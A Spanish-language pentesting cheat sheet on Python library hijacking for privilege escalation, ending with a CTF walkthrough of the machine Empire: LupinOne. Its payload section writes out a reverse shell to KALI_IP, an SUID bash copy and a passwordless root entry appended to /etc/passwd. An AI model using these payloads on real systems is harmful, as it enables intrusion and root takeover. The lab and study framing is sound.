# Python Library Hijacking

## Descripción

Python Library Hijacking es una técnica de escalada de privilegios que explota cómo Python busca e importa módulos. Si un script privilegiado importa un módulo y el atacante puede **modificar o reemplazar** ese módulo, puede ejecutar código arbitrario con los privilegios del script.

---

## Cómo funciona Python al importar módulos

Cuando Python ejecuta `import webbrowser`, busca el módulo en este orden (sys.path):

```python
['', '/usr/lib/python39.zip', '/usr/lib/python3.9', '/usr/lib/python3/dist-packages', ...]
```

1. `''` → directorio de trabajo actual
2. Directorios de la variable `PYTHONPATH`
3. Directorios estándar de instalación

Si encuentra el módulo en cualquiera de estos directorios, lo carga y ejecuta.

---

## Tipos de Python Library Hijacking

### Tipo 1 — Módulo del sistema con permisos de escritura ⭐

El módulo real tiene permisos incorrectos y cualquier usuario puede modificarlo:

```shell
# Verificar permisos del módulo
ls -la /usr/lib/python3.9/webbrowser.py
# Si aparece 'w' para otros → vulnerable

# Editar el módulo real
nano /usr/lib/python3.9/webbrowser.py
```

Añadir al principio del archivo:
```python
import os
os.system('/bin/bash')
```

### Tipo 2 — Directorio de trabajo escribible

Si el directorio de trabajo cuando se ejecuta el script es escribible, crear un archivo con el nombre del módulo ahí:

```shell
# Si el script se ejecuta desde /tmp
cd /tmp
cat > webbrowser.py << 'EOF'
import os
os.system('/bin/bash')
EOF

sudo -u usuario /usr/bin/python3.9 /ruta/script.py
```

### Tipo 3 — PYTHONPATH

Si sudo permite preservar variables de entorno:

```shell
PYTHONPATH=/tmp sudo -E -u usuario /usr/bin/python3.9 /ruta/script.py
```

---

## Detección — cómo identificar el vector

### Paso 1 — Ver qué módulos importa el script

```shell
cat /ruta/script.py
# Buscar líneas: import X, from X import Y
```

### Paso 2 — Encontrar dónde está el módulo

```shell
python3 -c "import webbrowser; print(webbrowser.__file__)"
# /usr/lib/python3.9/webbrowser.py
```

### Paso 3 — Verificar permisos

```shell
ls -la /usr/lib/python3.9/webbrowser.py
# ¿Tienes permisos de escritura?
```

### Paso 4 — Ver sys.path

```shell
python3 -c "import sys; print(sys.path)"
# ¿Hay algún directorio escribible antes que el módulo real?
```

---

## Payloads útiles

### Shell interactiva

```python
import os
os.system('/bin/bash')
```

### Reverse shell

```python
import os
os.system('bash -c "bash -i >& /dev/tcp/KALI_IP/4444 0>&1"')
```

### Copiar bash con SUID

```python
import os
os.system('cp /bin/bash /tmp/bash && chmod +s /tmp/bash')
```

### Añadir usuario root

```python
import os
os.system('echo "hacker::0:0::/root:/bin/bash" >> /etc/passwd')
```

---

## Checklist rápido

```
[ ] cat script.py → ¿qué módulos importa?
[ ] python3 -c "import MODULO; print(MODULO.__file__)" → ubicación del módulo
[ ] ls -la MODULO → ¿permisos de escritura?
[ ] Si sí → nano MODULO → añadir payload al principio
[ ] sudo -u usuario python3 script.py → ejecutar
[ ] Si no → python3 -c "import sys; print(sys.path)" → ¿directorio escribible antes?
```

---

## Ejemplo real — Máquina Empire: LupinOne

```shell
# heist.py importaba webbrowser
cat /home/arsene/heist.py
# import webbrowser

# Encontrar el módulo real
python3.9 -c "import webbrowser; print(webbrowser.__file__)"
# /usr/lib/python3.9/webbrowser.py

# Verificar permisos — escribible por otros
ls -la /usr/lib/python3.9/webbrowser.py
# -rw-r--rw-  ← 'w' al final = otros pueden escribir

# Editar el módulo
nano /usr/lib/python3.9/webbrowser.py
# Añadir al principio:
# import os
# os.system('/bin/bash')

# Ejecutar como arsene
sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
# whoami → arsene ✅
```
